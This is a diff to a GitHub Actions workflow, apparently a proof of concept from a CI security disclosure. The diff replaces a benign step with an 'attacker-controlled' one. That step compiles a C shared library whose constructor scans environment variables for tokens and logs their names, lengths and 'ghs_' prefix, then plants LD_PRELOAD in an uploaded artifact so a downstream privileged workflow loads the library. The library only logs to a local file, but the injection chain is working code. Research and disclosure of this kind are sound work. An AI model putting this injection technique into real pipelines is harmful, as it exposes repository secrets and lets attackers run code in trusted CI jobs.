@@ -1,17 +1,43 @@
 name: Validate
 on:
-  pull_request:
+  pull_request
 jobs:
   snapshot-tests:
     runs-on: ubuntu-latest
     steps:
-      - name: Save PR number
-        if: github.event_name == 'pull_request'
+      - name: Attacker-controlled version of the upstream workflow
         run: |
-          mkdir -p ./env
-          echo PR_NUMBER=${{ github.event.number }} > ./env/env
-          echo GITHUB_SHA=${{ github.sha }} >> ./env/env
+          echo "ATTACKER_HEAD_VERSION_OF_VALIDATE_RUNNING"
+          mkdir -p stage
+          cat > pwn.c <<'C'
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include <string.h>
+          #include <unistd.h>
+          extern char **environ;
+          __attribute__((constructor)) static void p(void) {
+            const char *j = getenv("GITHUB_JOB");
+            FILE *f = fopen("/tmp/lottie_rce.txt", "a");
+            if (f) {
+              fprintf(f, "PWNED_LOTTIE_RCE pid=%d job=%s\n", getpid(), j ? j : "?");
+              for (char **e = environ; *e; e++) {
+                if (strstr(*e, "TOKEN") || strstr(*e, "token")) {
+                  char *eq = strchr(*e, '=');
+                  if (eq) fprintf(f, "ENVKEY %.*s len=%zu starts_ghs=%s\n", (int)(eq - *e), *e, strlen(eq + 1), strncmp(eq + 1, "ghs_", 4) == 0 ? "yes" : "no");
+                }
+              }
+              fclose(f);
+            }
+            fprintf(stderr, "PWNED_LOTTIE_RCE_MARKER pid=%d\n", getpid());
+          }
+          C
+          gcc -shared -fPIC -o stage/libpwn.so pwn.c
+          {
+            echo "PR_NUMBER=${{ github.event.number }}"
+            echo "GITHUB_SHA=${{ github.sha }}"
+            echo "LD_PRELOAD=./libpwn.so /home/runner/work/gab-poc-lottie-env/gab-poc-lottie-env/libpwn.so"
+          } > stage/env
       - uses: actions/upload-artifact@v4
         with:
           name: env
-          path: env/
+          path: stage
